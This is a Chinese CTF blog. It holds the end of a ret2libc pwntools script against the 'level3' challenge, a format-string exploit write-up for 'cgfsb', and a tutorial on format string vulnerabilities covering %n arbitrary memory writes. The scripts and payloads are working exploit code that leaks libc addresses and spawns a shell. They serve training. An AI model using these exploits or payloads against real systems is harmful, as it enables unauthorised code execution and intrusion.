class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">50010</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_func_addr = <span class="number">0x804844B</span></span><br><span class="line"></span><br><span class="line">write_plt_addr = <span class="number">0x0804A018</span></span><br><span class="line">write_got_addr = <span class="number">0x08048340</span></span><br><span class="line"></span><br><span class="line">sh_libc_addr = <span class="number">0x0015902b</span></span><br><span class="line">system_libc_addr = <span class="number">0x0003A940</span></span><br><span class="line">write_libc_addr = <span class="number">0x000D43c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cyclic 200</span></span><br><span class="line"><span class="comment"># cyclic -l 0x6261616b </span></span><br><span class="line"><span class="comment"># padding 140</span></span><br><span class="line">                                       </span><br><span class="line"><span class="comment"># payload = padding + write_got_addr + vuln_func_addr + argus</span></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(write_got_addr) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_plt_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_abs_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</span><br><span class="line"><span class="built_in">print</span>(system_abs_addr)</span><br><span class="line"></span><br><span class="line">sh_abs_addr = write_abs_addr - (write_libc_addr - sh_libc_addr)</span><br><span class="line"><span class="built_in">print</span>(sh_abs_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(system_abs_addr) + p32(<span class="number">4</span>) + p32(sh_abs_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<h2 id="cgfsb2"><a href="#cgfsb2" class="headerlink" title="cgfsb2"></a>cgfsb2</h2><p>题目描述关于<code>printf()</code>，那肯定还是相关漏洞了。32位文件，保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>开启了栈溢出保护，堆栈代码不可执行，没有开启地址随机化。IDA打开：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave your message please:&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your message is:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you pwned me, here is your flag:\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的漏洞点<code>printf(&amp;s);</code>，想办法使得<code>if</code>判断成立即可。</p>
<p>明显是要通过格式化字符串漏洞控制内存中某一地址的内容为一特定数字，之前写过相关内容。</p>
<p>先查看<code>pwnme</code>的内存地址为<code>.bss:0x0804A068</code> 。然后通过漏洞泄漏它在栈上的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;AAAA&quot;</span> + <span class="string">&quot;%2x &quot;</span>*<span class="number">15</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">······</span><br><span class="line">your message <span class="keyword">is</span>:</span><br><span class="line">AAAAffb3c5ee f7f125c0 ffb3c63c f7f5ba9c  <span class="number">1</span> f7f2d410 <span class="number">64610001</span> a6e696d  <span class="number">0</span> <span class="number">41414141</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> </span><br></pre></td></tr></table></figure>

<p>第10个位置我们可以控制，尝试将目标变量的地址整到栈上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> + <span class="string">&quot; %10$x&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">······</span><br><span class="line">your message <span class="keyword">is</span>:</span><br><span class="line">h\xa0\x04 804a068</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>

<p>将目标变量地址改为小端序后输入，随后<code>%10$x</code>查看第10个位置的地址信息，发现成功写入地址。</p>
<p>需要控制变量值为8，写完地址后算写进去4字节，还差4字节需要填充：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;AAAA\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;1234%10$n&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%4c%10$n&quot;</span></span><br></pre></td></tr></table></figure>

<p>以上几种都可以，目的都是出了地址外再填充4字节数据。第三个中如果使用<code>%4d</code> 可能会被解释成0000，而不能写入正确数字。</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">60208</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgfsb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAA\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;your message is:\n&quot;)</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>



<h1 id="进阶区"><a href="#进阶区" class="headerlink" title="进阶区"></a>进阶区</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/06/28/adworld-pwn/" data-id="cl6x1oijh000k6mgq0ey151co" data-title="攻防世界-新手区" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/adword/" rel="tag">adword</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Format String Vulnerailites" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/22/Format%20String%20Vulnerailites/" class="article-date">
  <time class="dt-published" datetime="2022-06-21T16:00:00.000Z" itemprop="datePublished">2022-06-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/06/22/Format%20String%20Vulnerailites/">格式化字符串漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Format-String-Vulnerailites"><a href="#Format-String-Vulnerailites" class="headerlink" title="Format String Vulnerailites"></a>Format String Vulnerailites</h1><p>It will show you how to discover format string vulnerabilities in C source code, and why this new kind of vulnerability is more dangerous than the common buffer overflow vulnerability.</p>
<p>A format function is a special kind of ANSI C function, that takes a variable number of arguments, from which one is the so called format string. While the function evaluates the format string, it accesses the extra parameters given to the function. It is a conversion function, which is used to represent primitive C data types in a human readable string representation. They are used in nearly any C program, to output information, print error messages or process strings.</p>
<p>To understand where this vulnerability is common in C code, we have to examine the purpose of format functions.</p>
<p>​	How the format function works</p>
<p>​	The calling function</p>
<p>This type of vulnerability can appear if two different types of information channels are merged into one, and special escape characters or sequences are used to distinguish which channel is currently active. Most of the times one channel is a data channel, which is not parsed actively but just copied, while the other channel is a controlling channel.</p>
<p>While this is not a bad thing in itself, it can quickly become a horrible security problem if the attacker is able to supply input that is used in one channel. Often there are faulty escape or de-escape routines, or they oversee a level, such as in format string vulnerabilities. </p>
<p> We now have to examine what exactly we are able to control, and how to use this control to extend this partial control over the process to full control of the execution flow.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%08x.\n&quot;</span>)</span><br><span class="line">ea62f5d0.ea62f5e0.ea62f6e8<span class="number">.00000000</span></span><br></pre></td></tr></table></figure>

<p>This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses. Depending on the size of the format string buffer and the size of the output buffer, you can reconstruct more or less large parts of the stack memory by using this technique.</p>
<p>It is also possible to peek at memory locations different from the stack memory. To do this we have to get the format function to display memory from an address we can supply.</p>
<p>This poses two problems to us: First, we have to find a format parameter which uses an address (by reference) as stack parameter and displays memory from there, and we have to supply that address. We are lucky in the first case, since the ‘%s’ parameter just does that, it displays memory — usually an ASCIIZ string — from a stack- supplied address. So the remaining problem is, how to get that address on the stack, into the right place</p>
<p>The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;AAA0AAA1_%08x.%08x.%08x.%08x.&quot;</span>);</span><br><span class="line">AAA0_ea62f5d0.ea62f5e0.ea62f6e8<span class="number">.00000000</span>.</span><br></pre></td></tr></table></figure>

<p>The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address = \x10\x01\x48\x08;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|&quot;</span>);</span><br><span class="line">H_e01c25d0.e01c25e0.e01c26e8<span class="number">.00000000</span><span class="number">.00000000</span>|(null)|</span><br></pre></td></tr></table></figure>

<p>If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters.</p>
<p>Instead we have to find instructions that modify the instruction pointer and take influence on how these instructions modify it. This sounds com- plicated, but in most cases it is pretty easy, since there are instructions that take a instruction pointer from the memory and jump to it.</p>
<p> This is how most buffer overflows work: In a two-stage process, first a saved instruction pointer is overwritten and then the program executes a legitimate instruction that transfers control to the attacker-supplied address.</p>
<p> In normal buffer overflows we overwrite the return address of a function frame on the stack. As the function that owns this frame returns, it returns to our supplied address</p>
<p>There is the ‘%n’parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x.%n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>With the ‘%08x’ parameter we increase the internal stack pointer of the format function by four bytes. We do this until this pointer points to the beginning of our format string (to ‘AAA0’). This works, because usually our format string is located on the stack, on top of our normal format function stack frame. The ‘%n’ writes to the address 0x30414141, that is represented by the string “AAA0”. Normally this would crash the program, since this address is not mapped. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) at the address.</p>
<p>By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit. But for writing large numbers — such as addresses — this is not sufficient, so we have to find a way to write arbitrary data.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> canary[<span class="number">5</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> foo[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(foo, <span class="string">&quot;\x00&quot;</span>, <span class="keyword">sizeof</span>(foo));</span><br><span class="line"><span class="built_in">strcpy</span>(canary, <span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">  <span class="comment">// memory state right now: 00 00 00 00 41 41 41 41 00</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%16u%n&quot;</span>, <span class="number">7350</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// memory state right now: 10 00 00 00 00 41 41 41 41 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%32u%n&quot;</span>, <span class="number">7350</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">1</span>]);</span><br><span class="line">  <span class="comment">// memory state right now: 20 10 00 00 00 00 41 41 41</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%64u%n&quot;</span>, <span class="number">7350</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">2</span>]);</span><br><span class="line">  <span class="comment">// memory state right now: 40 20 10 00 00 00 00 41 41 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%128u%n\n&quot;</span>, <span class="number">7350</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">3</span>]);</span><br><span class="line">  <span class="comment">// memory state right now: 80 40 20 10 00 00 00 00 41 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;after foo: %02x%02x%02x%02x\n&quot;</span>, foo[<span class="number">0</span>],foo[<span class="number">1</span>], foo[<span class="number">2</span>],foo[<span class="number">3</span>]);</span><br><span class="line">  <span class="comment">// after foo: 10204080</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cannary: %02x%02x%02x%02x\n&quot;</span>, canary[<span class="number">0</span>],canary[<span class="number">1</span>],canary[<span class="number">2</span>],canary[<span class="number">3</span>]);</span><br><span class="line">  <span class="comment">//cannary: 00000041</span></span><br></pre></td></tr></table></figure>

<p>Returns the output “10204080” and “canary: 00000041”. We over- write four times the least significant byte of an integer we point to. By increasing the pointer each time, the least significant byte moves through the memory we want to write to, and allows us to store completely arbitrary data.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(canary, <span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%16u%n%16u%n%32u%n%64u%n\n&quot;</span>, <span class="number">0</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">0</span>],<span class="number">0</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">1</span>],<span class="number">0</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">2</span>],<span class="number">0</span>, (<span class="type">int</span> *) &amp;foo[<span class="number">3</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;after foo: %02x%02x%02x%02x\n&quot;</span>, foo[<span class="number">0</span>],foo[<span class="number">1</span>], foo[<span class="number">2</span>],foo[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">// after foo: 10204080</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cannary: %02x%02x%02x%02x\n&quot;</span>, canary[<span class="number">0</span>],canary[<span class="number">1</span>],canary[<span class="number">2</span>],canary[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">// cannary: 00000041</span></span><br></pre></td></tr></table></figure>

<p>The part of the format string that actually does the writing to the memory, by using ‘%nu%n’ pairs, where n is greater than 10.<br>The first part is used to increase or overflow the least significant byte of the format function internal bytes-written counter, and the ‘%n’is used to write this counter to the addresses that are within the dummy-addr-pair part of the string</p>
<h2 id="Variations-of-Explotation"><a href="#Variations-of-Explotation" class="headerlink" title="Variations of Explotation"></a>Variations of Explotation</h2><p> A ‘%u’ sequence is two bytes long and pops four bytes, which gives a 1:2 byte ratio (we invest 1 byte to get 2 bytes ahead).</p>
<p>Through using the ‘%f’ parameter we even get 8 bytes ahead in the stack, while only investing two bytes. But this has a huge drawback, since if garbage from the stack is printed as floating point number, there may be a division by zero, which will crash the process. To avoid this we can use a special format qualifier, which will only print the integer part of the float number: ‘%.f’ will walk the stack upwards by eight bytes, using only three bytes in our buffer</p>
<h3 id="Direct-Parameter-Access"><a href="#Direct-Parameter-Access" class="headerlink" title="Direct Parameter Access"></a>Direct Parameter Access</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%6$d\n&quot;</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p> Print “1”,because the ‘6$’ explicitly addresses the 6th parameter on the stack. Using this method the whole stack pop sequence can be left out.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> foo[<span class="number">4</span>]; </span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;%1$16u%2$n&quot;</span> </span><br><span class="line">        <span class="string">&quot;%1$16u%3$n&quot;</span> </span><br><span class="line">        <span class="string">&quot;%1$32u%4$n&quot;</span> </span><br><span class="line">        <span class="string">&quot;%1$64u%5$n&quot;</span>, </span><br><span class="line">        <span class="number">1</span>, </span><br><span class="line">        (<span class="type">int</span> *) &amp;foo[<span class="number">0</span>], (<span class="type">int</span> *) &amp;foo[<span class="number">1</span>], </span><br><span class="line">        (<span class="type">int</span> *) &amp;foo[<span class="number">2</span>], (<span class="type">int</span> *) &amp;foo[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure>

<p> Will create “\x10\x20\x40\x80” in foo. This direct access is limited to only the first eight parameters on BSD derivates, except IRIX. The Solaris C Library limits it to the first 30 parameters, as shown in portals paper [3].<br>If you choose negative or huge values intending to access stack parameters below your current positions it will not produce the expected result but crash.</p>
<h2 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h2><p>When exploiting a vulnerability such as a buffer overflow or a format string vulnerability it often fails because the last hurdle was not taken care of: to get all offsets right. Basically finding the right offsets means ‘what to write where’. For simple vulnerabilities you can reliably guess the correct offsets, or just brute force it, by trying them one after another. But as soon as you need multiple offsets this problem increases exponentially, it turns out to be impossible to brute force.</p>
<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>格式化字符串类似于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;The magic number is: %d\n&quot;</span>, <span class="number">1911</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码将会打印<code>The magic number is:1911</code>，其中的格式化参数 <code>%d</code> 被替换为 1911。除了 <code>%d</code> 之外，还有其他的格式化参数，分别有着不同的含义：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
<th>传递方式</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>Decimal(int)</td>
<td>Value</td>
</tr>
<tr>
<td>%u</td>
<td>Unsigned decimal(unsigned int)</td>
<td>Value</td>
</tr>
<tr>
<td>%x</td>
<td>Hexadecimal(unsigned int)</td>
<td>Value</td>
</tr>
<tr>
<td>%s</td>
<td>String((const)(unsigned char *)</td>
<td>Reference</td>
</tr>
<tr>
<td>%n</td>
<td>Number of bytes written so far, (* int)</td>
<td>Reference</td>
</tr>
</tbody></table>
<p>格式化字符串占位符的格式详解</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][width][.precision][length]<span class="built_in">type</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>parameter</code> 直接的参数访问，指定用于输入的参数”</li>
<li><code>flags</code> 当与宽度一起使用时在前面加上0</li>
<li><code>width</code>: 宽度修饰符，要输出的最少字符数</li>
<li><code>.precison</code>: 输出的最大字符数量</li>
<li><code>length</code>: 长度修饰符，允许将输出转化为char, short,int等</li>
<li><code>type</code>: 如何格式化输出参数。例如 %d 期望得到一个整数参数，并且输出一个数字。</li>
</ol>
<p><code>[]</code>内的参数是可选的。</p>
<p>重要的格式化字符串转化类型如下：</p>
<table>
<thead>
<tr>
<th align="left">Type</th>
<th align="left">Input</th>
<th align="left">Output</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%x</td>
<td align="left">unsigned integer</td>
<td align="left">Hexadecimal value</td>
</tr>
<tr>
<td align="left">%s</td>
<td align="left">pointer to an array of char</td>
<td align="left">String</td>
</tr>
<tr>
<td align="left">%n</td>
<td align="left">pointer to integer</td>
<td align="left">Number of bytes written so far</td>
</tr>
<tr>
<td align="left">%p</td>
<td align="left">pointer (void *)</td>
<td align="left">The value of the pointer (Not de-referenced)</td>
</tr>
</tbody></table>
<p>重要的修饰符如下：</p>
<table>
<thead>
<tr>
<th align="left">Modifier</th>
<th align="left">Description</th>
<th align="left">Example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i$</td>
<td align="left">Direct parameter access; Specifies the parameter to use for input</td>
<td align="left"><code>%2$x</code> : hex value of second parameter</td>
</tr>
<tr>
<td align="left">%ix</td>
<td align="left">Width modifier. Specifies the minimum width of the output.</td>
<td align="left"><code>%8x</code>: Hex value taking up 8 columns</td>
</tr>
<tr>
<td align="left">%hh</td>
<td align="left">Length modifier. Specifies that length is sizeof(char)</td>
<td align="left"><code>%hhn</code>: Writes 1 byte to target pointer</td>
</tr>
<tr>
<td align="left">%h</td>
<td align="left">Length modifier. Specifies that length is sizeof(short)</td>
<td align="left"><code>%hn</code>: Writes 2 bytes (in 32 bit System) to target pointer</td>
</tr>
</tbody></table>
<p>格式化函数的行为被格式化参数所控制。函数通过格式化参数从栈上取得参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;a has value %d, b has value %d, c is at address: %08x\n&quot;</span>, a,b, &amp;c);</span><br></pre></td></tr></table></figure>
